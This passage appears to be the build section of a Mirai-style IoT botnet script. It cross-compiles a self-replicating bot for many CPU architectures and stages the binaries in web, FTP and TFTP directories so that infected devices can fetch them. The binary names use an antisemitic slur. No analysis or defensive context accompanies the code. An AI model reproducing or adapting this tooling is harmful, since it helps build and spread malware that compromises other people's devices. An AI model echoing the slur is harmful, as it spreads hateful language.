...
echo "COMPILING i586"
compile_bot i586 jew.x86 "-static -DSELFREP"
echo "COMPILING mips"
compile_bot mips jew.mips "-static -DSELFREP"
echo "COMPILING mipsel"
compile_bot mipsel jew.mpsl "-static -DSELFREP"
echo "COMPILING armv4l"
compile_bot armv4l jew.arm "-static -DSELFREP"
echo "COMPILING armv5l"
compile_bot armv5l jew.arm5 "-DSELFREP"
echo "COMPILING armv6l"
compile_bot armv6l jew.arm6 "-static -DSELFREP"
echo "COMPILING armv7l"
compile_bot armv7l jew.arm7 "-static -DSELFREP"
echo "COMPILING ppc"
compile_bot powerpc jew.ppc "-static -DSELFREP"
echo "COMPILING sparc"
compile_bot sparc jew.spc "-static -DSELFREP"
echo "COMPILING m68k"
compile_bot m68k jew.m68k "-static -DSELFREP"
echo "COMPILING sh4"
compile_bot sh4 jew.sh4 "-static -DSELFREP"
cp release/jew* /var/www/html/bins
cp release/jew* /var/ftp
mv release/jew* /var/lib/tftpboot
